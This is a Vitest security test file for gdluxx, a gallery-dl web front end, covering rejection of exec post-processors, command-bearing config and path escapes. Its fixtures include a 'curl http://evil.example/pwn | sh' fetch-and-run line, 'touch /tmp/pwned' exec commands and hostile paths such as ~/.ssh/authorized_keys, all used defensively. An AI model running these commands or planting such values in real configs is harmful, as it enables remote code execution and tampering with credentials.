/*
 * Copyright (C) 2025 jsouthgb
 *
 * This file is part of gdluxx.
 *
 * gdluxx is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 (GPL-2.0),
 * as published by the Free Software Foundation.
 */

import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import { mkdtemp, readFile, rm } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';

const ORIGINAL_FILE_STORAGE_PATH = process.env.FILE_STORAGE_PATH;
const ORIGINAL_DOWNLOAD_PATH = process.env.DOWNLOAD_PATH;
const ORIGINAL_GALLERY_DL_MODE = process.env.GDLUXX_GDL_POLICY;

// api-utils.ts imports `dev` from $app/environment, unavailable outside SvelteKit.
vi.mock('$app/environment', () => ({ dev: false, building: false, browser: false }));

vi.mock('$lib/server/logger', () => ({
  serverLogger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

// Mutable because the environment mock reads this at module initialization.
let dockerMockValue = false;
vi.mock('../src/lib/server/environment', () => ({
  isRunningInDockerCached: () => dockerMockValue,
}));

let dataDir: string;

beforeEach(async () => {
  dockerMockValue = false;
  dataDir = await mkdtemp(join(tmpdir(), 'gdluxx-config-hardening-'));
  process.env.FILE_STORAGE_PATH = dataDir;
  delete process.env.DOWNLOAD_PATH;
  delete process.env.GDLUXX_GDL_POLICY;
  // config-utils.ts captures DATA_PATH from FILE_STORAGE_PATH at module
  // load time, so every test needs a fresh module graph for its own dataDir.
  vi.resetModules();
});

afterEach(async () => {
  await rm(dataDir, { recursive: true, force: true });
  if (ORIGINAL_FILE_STORAGE_PATH === undefined) {
    delete process.env.FILE_STORAGE_PATH;
  } else {
    process.env.FILE_STORAGE_PATH = ORIGINAL_FILE_STORAGE_PATH;
  }
  if (ORIGINAL_DOWNLOAD_PATH === undefined) {
    delete process.env.DOWNLOAD_PATH;
  } else {
    process.env.DOWNLOAD_PATH = ORIGINAL_DOWNLOAD_PATH;
  }
  if (ORIGINAL_GALLERY_DL_MODE === undefined) {
    delete process.env.GDLUXX_GDL_POLICY;
  } else {
    process.env.GDLUXX_GDL_POLICY = ORIGINAL_GALLERY_DL_MODE;
  }
  vi.resetModules();
});

function loadConfigUtils() {
  return import('../src/lib/server/config-utils');
}

function loadConfigRoute() {
  return import('../src/routes/api/config/+server');
}

function loadMergeRoute() {
  return import('../src/routes/api/config/merge/+server');
}

async function readConfigOnDisk(): Promise<string | null> {
  try {
    return await readFile(join(dataDir, 'config.json'), 'utf-8');
  } catch {
    return null;
  }
}

// Generic over the concrete route handler so the resulting event satisfies
// that handler's own (route-id-narrowed) RequestEvent type rather than the
// broader ambient RequestHandler from '@sveltejs/kit'.
function requestEvent<Handler extends (event: never) => unknown>(
  request: Request,
): Parameters<Handler>[0] {
  return { request, locals: { user: { id: 'test-user' } } } as Parameters<Handler>[0];
}

function benignConfig(baseDir: string): string {
  return JSON.stringify(
    {
      extractor: {
        'base-directory': baseDir,
        twitter: { username: 'user', password: 'hunter2', 'access-token': 'abc123' },
      },
    },
    null,
    2,
  );
}

// AUTH-002 fixture: a gallery-dl `exec` post-processor runs shell commands
// on every job invocation (`gallery-dl <url> --config data/config.json`).
function execPostprocessorNested(): string {
  return JSON.stringify({
    extractor: {
      postprocessors: [{ name: 'exec', command: ['touch', '/tmp/pwned'] }],
    },
  });
}

function execPostprocessorTopLevel(): string {
  return JSON.stringify({
    postprocessor: [{ name: 'exec', command: ['touch', '/tmp/pwned'] }],
  });
}

function commandBearingNonExecPostprocessor(): string {
  return JSON.stringify({
    extractor: {
      postprocessors: [{ name: 'metadata-plus', commands: ['curl http://evil.example/pwn | sh'] }],
    },
  });
}

function deeplyNestedConfig(): string {
  let nested: unknown = { leaf: true };
  for (let i = 0; i < 66; i++) {
    nested = { nested };
  }
  return JSON.stringify({
    command: ['gdluxx-mode-sentinel'],
    'base-directory': '/gdluxx-mode-sentinel/outside',
    nested,
  });
}

function setGalleryDlMode(mode: 'restricted' | 'unrestricted'): void {
  process.env.GDLUXX_GDL_POLICY = mode;
  vi.resetModules();
}

const HOSTILE_BASE_DIRECTORIES = ['/root/.bashrc', '~/.ssh/authorized_keys', '../../etc'];

function multipartRequest(url: string, filename: string, body: string): Request {
  const form = new FormData();
  form.set('file', new File([body], filename, { type: 'application/json' }));
  return new Request(url, { method: 'POST', body: form });
}

function jsonConfigRequest(url: string, content: string): Request {
  return new Request(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ content }),
  });
}

function mergeRequest(url: string, path: string[], value: unknown): Request {
  return new Request(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ path, value, overwrite: true }),
  });
}

describe('writeConfigFile: benign config (regression guard)', () => {
  test('a normal gallery-dl config (extractors, base-directory under the data dir, auth tokens) saves successfully', async () => {
    const mod = await loadConfigUtils();
    const content = benignConfig(join(dataDir, 'downloads'));

    const result = await mod.writeConfigFile(content);

    expect(result.success).toBe(true);
    expect(await readConfigOnDisk()).toBe(content);
  });
});

describe('writeConfigFile: exec/command containment [REM-006]', () => {
  test('REM-006: writeConfigFile rejects an exec post-processor, nested and top-level', async () => {
    const mod = await loadConfigUtils();

    await expect(mod.writeConfigFile(execPostprocessorNested())).rejects.toThrow();
    await expect(mod.writeConfigFile(execPostprocessorTopLevel())).rejects.toThrow();
  });

  test('REM-006: writeConfigFile rejects a command-bearing non-exec post-processor', async () => {
    const mod = await loadConfigUtils();

    await expect(mod.writeConfigFile(commandBearingNonExecPostprocessor())).rejects.toThrow();
  });

  test('REM-006: writeConfigFile rejects a base-directory/path that escapes the data dir', async () => {
    const mod = await loadConfigUtils();

    for (const hostilePath of HOSTILE_BASE_DIRECTORIES) {
      const content = JSON.stringify({ extractor: { 'base-directory': hostilePath } });
      await expect(mod.writeConfigFile(content)).rejects.toThrow();
    }
  });

  test('REM-006 T-4.5: writeConfigFile rejects a command-bearing object outside any postprocessor container', async () => {
    const mod = await loadConfigUtils();

    const content = JSON.stringify({ a: { b: { c: { commands: ['gdluxx-rem006-sentinel'] } } } });
    await expect(mod.writeConfigFile(content)).rejects.toThrow();
    expect(await readConfigOnDisk()).toBeNull();
  });
});

describe('writeConfigFile: deployment mode enforcement', () => {
  test('Restricted preserves command and unconfined-path blocking', async () => {
    setGalleryDlMode('restricted');
    const mod = await loadConfigUtils();

    await expect(mod.writeConfigFile(execPostprocessorNested())).rejects.toThrow();
    await expect(
      mod.writeConfigFile(
        JSON.stringify({ extractor: { 'base-directory': '/gdluxx-mode-sentinel/outside' } }),
      ),
    ).rejects.toThrow();
    expect(await readConfigOnDisk()).toBeNull();
  });

  test('Unrestricted permits command and unconfined-path findings at save time', async () => {
    setGalleryDlMode('unrestricted');
    const mod = await loadConfigUtils();

    const commandConfig = execPostprocessorNested();
    await expect(mod.writeConfigFile(commandConfig)).resolves.toMatchObject({ success: true });
    expect(await readConfigOnDisk()).toBe(commandConfig);

    const pathConfig = JSON.stringify({
      extractor: { 'base-directory': '/gdluxx-mode-sentinel/outside' },
    });
    await expect(mod.writeConfigFile(pathConfig)).resolves.toMatchObject({ success: true });
    expect(await readConfigOnDisk()).toBe(pathConfig);
  });

  test.each(['restricted', 'unrestricted'] as const)(
    '%s still rejects malformed and excessively nested config',
    async (mode) => {
      setGalleryDlMode(mode);
      const mod = await loadConfigUtils();

      await expect(mod.writeConfigFile('not valid json {{')).rejects.toThrow();
      await expect(mod.writeConfigFile('[]')).rejects.toThrow();
      await expect(mod.writeConfigFile(deeplyNestedConfig())).rejects.toThrow();
      expect(await readConfigOnDisk()).toBeNull();
    },
  );

  test.each(['restricted', 'unrestricted'] as const)(
    '%s applies Docker path transformation before path enforcement',
    async (mode) => {
      dockerMockValue = true;
      setGalleryDlMode(mode);
      const mod = await loadConfigUtils();
      const content = JSON.stringify({ extractor: { 'base-directory': '~/outside' } });

      await expect(mod.writeConfigFile(content)).resolves.toMatchObject({
        success: true,
        transformed: true,
      });
      expect(JSON.parse((await readConfigOnDisk()) as string)).toEqual({
        extractor: { 'base-directory': '/app/data/downloads' },
      });
    },
  );
});

describe('POST /api/config: write-path containment [REM-006]', () => {
  test('REM-006: the multipart branch validates JSON before writing, not just the .json filename', async () => {
    const { POST } = await loadConfigRoute();

    const response = await POST(
      requestEvent<typeof POST>(
        multipartRequest('http://localhost/api/config', 'config.json', 'not valid json {{'),
      ),
    );

    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(await readConfigOnDisk()).toBeNull();
  });

  test('REM-006: the multipart branch rejects an exec-bearing config', async () => {
    const { POST } = await loadConfigRoute();

    const response = await POST(
      requestEvent<typeof POST>(
        multipartRequest('http://localhost/api/config', 'config.json', execPostprocessorNested()),
      ),
    );

    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(await readConfigOnDisk()).toBeNull();
  });

  test('REM-006: the JSON branch rejects an exec-bearing config', async () => {
    const { POST } = await loadConfigRoute();

    const response = await POST(
      requestEvent<typeof POST>(
        jsonConfigRequest('http://localhost/api/config', execPostprocessorNested()),
      ),
    );

    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(await readConfigOnDisk()).toBeNull();
  });

  test('REM-006: POST /api/config/merge rejects an exec-bearing value', async () => {
    const utilsMod = await loadConfigUtils();
    await utilsMod.writeConfigFile(benignConfig(join(dataDir, 'downloads')));

    const { POST: mergePost } = await loadMergeRoute();
    const response = await mergePost(
      requestEvent<typeof mergePost>(
        mergeRequest(
          'http://localhost/api/config/merge',
          ['extractor', 'postprocessors'],
          [{ name: 'exec', command: ['touch', '/tmp/pwned'] }],
        ),
      ),
    );

    expect(response.status).toBeGreaterThanOrEqual(400);
    const written = await readConfigOnDisk();
    expect(written).not.toContain('"exec"');
  });
});
